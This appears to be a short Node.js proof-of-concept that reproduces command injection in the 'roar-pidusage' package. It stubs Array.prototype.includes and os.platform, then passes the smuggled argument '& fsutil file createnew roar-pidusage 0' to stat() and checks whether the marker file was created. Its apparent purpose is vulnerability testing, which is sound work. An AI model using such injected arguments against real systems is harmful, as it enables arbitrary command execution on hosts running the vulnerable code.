Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const os = require('os');
os.platform = () => {
    return 'freebsd';
};
const roar_pidusage = require('roar-pidusage');
const fs = require('fs');
const path = './roar-pidusage';
roar_pidusage.stat('& fsutil file createnew roar-pidusage 0', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});